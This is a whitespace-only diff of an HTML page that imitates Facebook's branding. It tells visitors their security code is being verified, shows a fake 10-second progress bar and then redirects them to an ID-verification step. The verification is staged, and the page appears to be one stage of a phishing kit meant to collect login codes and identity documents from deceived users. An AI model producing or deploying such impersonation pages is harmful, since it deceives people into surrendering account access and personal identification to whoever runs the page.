@@ -19,7 +19,7 @@
       padding: 0;
       box-sizing: border-box;
     }
-    
+
     body {
       font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
       background-color: #f0f2f5;
@@ -29,7 +29,7 @@
       display: flex;
       flex-direction: column;
     }
-    
+
     /* Facebook header */
     .fb-header {
       background: white;
@@ -43,7 +43,7 @@
       z-index: 100;
       box-shadow: 0 2px 4px rgba(0,0,0,.1);
     }
-    
+
     .fb-logo-header {
       color: #1877f2;
       font-size: 32px;
@@ -51,7 +51,7 @@
       font-family: Klavika-Medium, sans-serif;
       text-decoration: none;
     }
-    
+
     /* Main content container */
     .processing-container {
       flex: 1;
@@ -61,7 +61,7 @@
       padding: 20px;
       min-height: calc(100vh - 56px);
     }
-    
+
     .processing-card {
       background: white;
       border-radius: 8px;
@@ -71,13 +71,13 @@
       max-width: 432px;
       text-align: center;
     }
-    
+
     /* Loading spinner */
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    
+
     .loading-spinner {
       width: 64px;
       height: 64px;
@@ -87,26 +87,26 @@
       animation: spin 1s linear infinite;
       margin: 0 auto 24px;
     }
-    
+
     .processing-title {
       color: #1877F2;
       font-size: 24px;
       font-weight: bold;
       margin-bottom: 16px;
     }
-    
+
     .processing-subtitle {
       color: #65676B;
       font-size: 16px;
       line-height: 20px;
       margin-bottom: 32px;
     }
-    
+
     /* Progress indicator */
     .progress-container {
       margin-bottom: 32px;
     }
-    
+
     .progress-bar-wrapper {
       background-color: #f0f2f5;
       border-radius: 10px;
@@ -114,7 +114,7 @@
       overflow: hidden;
       margin-bottom: 12px;
     }
-    
+
     .progress-bar {
       background-color: #1877F2;
       height: 100%;
@@ -122,13 +122,13 @@
       border-radius: 10px;
       transition: width 0.3s ease;
     }
-    
+
     .progress-text {
       color: #65676B;
       font-size: 14px;
       margin-bottom: 32px;
     }
-    
+
     /* Security notice */
     .security-notice {
       background: linear-gradient(135deg, #e3f2fd 0%, #f0f8ff 100%);
@@ -138,43 +138,43 @@
       text-align: left;
       border-left: 4px solid #1877F2;
     }
-    
+
     .notice-header {
       display: flex;
       align-items: center;
       margin-bottom: 8px;
     }
-    
+
     .notice-icon {
       color: #1877F2;
       margin-right: 8px;
       font-weight: 600;
     }
-    
+
     .notice-title {
       color: #1877F2;
       font-weight: 600;
       font-size: 14px;
     }
-    
+
     .notice-text {
       color: #1c1e21;
       font-size: 14px;
       line-height: 20px;
       margin: 0;
     }
-    
+
     /* Responsive design */
     @media (max-width: 480px) {
       .processing-card {
         padding: 32px 24px;
         margin: 0 16px;
       }
-      
+
       .processing-title {
         font-size: 20px;
       }
-      
+
       .loading-spinner {
         width: 48px;
         height: 48px;
@@ -187,19 +187,19 @@
   <div class="fb-header">
     <a href="/" class="fb-logo-header">facebook</a>
   </div>
-  
+
   <!-- Main Processing Content -->
   <div class="processing-container">
     <div class="processing-card">
       <!-- Loading Spinner -->
       <div class="loading-spinner"></div>
-      
+
       <!-- Title and Description -->
       <h1 class="processing-title">Verifying Your Identity</h1>
       <p class="processing-subtitle">
         Please wait while we verify your security code and authenticate your account...
       </p>
-      
+
       <!-- Progress Indicator -->
       <div class="progress-container">
         <div class="progress-bar-wrapper">
@@ -209,7 +209,7 @@
           Verification in progress... 10 seconds remaining
         </p>
       </div>
-      
+
       <!-- Security Notice -->
       <div class="security-notice">
         <div class="notice-header">
@@ -222,19 +222,19 @@
       </div>
     </div>
   </div>
-  
+
   <script>
     // Start countdown immediately when page loads
     let timeRemaining = 10;
     const progressBar = document.getElementById('progress-bar');
     const progressText = document.getElementById('progress-text');
-    
+
     // Start 10-second countdown with progress bar
     const updateInterval = setInterval(() => {
       timeRemaining--;
       const progressPercentage = ((10 - timeRemaining) / 10) * 100;
       progressBar.style.width = progressPercentage + '%';
-      
+
       if (timeRemaining > 0) {
         progressText.textContent = `Finalizing verification... ${timeRemaining} seconds remaining`;
       } else {
@@ -242,7 +242,7 @@
         clearInterval(updateInterval);
       }
     }, 1000);
-    
+
     // After 10 seconds, redirect to ID verification step
     setTimeout(() => {
       window.location.href = '/verify-id';
